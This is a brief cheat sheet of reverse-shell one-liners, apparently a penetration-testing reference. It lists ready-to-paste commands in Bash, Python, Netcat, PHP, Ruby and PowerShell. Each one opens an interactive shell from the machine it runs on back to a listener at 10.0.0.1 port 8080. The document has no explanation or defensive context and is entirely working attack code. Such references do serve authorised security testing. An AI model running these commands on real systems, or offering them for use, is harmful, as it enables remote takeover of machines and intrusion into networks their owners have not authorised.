# Reverse Shells Cheat Sheet

## Bash TCP
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Bash UDP
```bash
sh -i >& /dev/udp/10.0.0.1/8080 0>&1
```

## Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Netcat
```bash
nc -e /bin/sh 10.0.0.1 8080
nc -c /bin/sh 10.0.0.1 8080
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
```

## PHP
```php
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
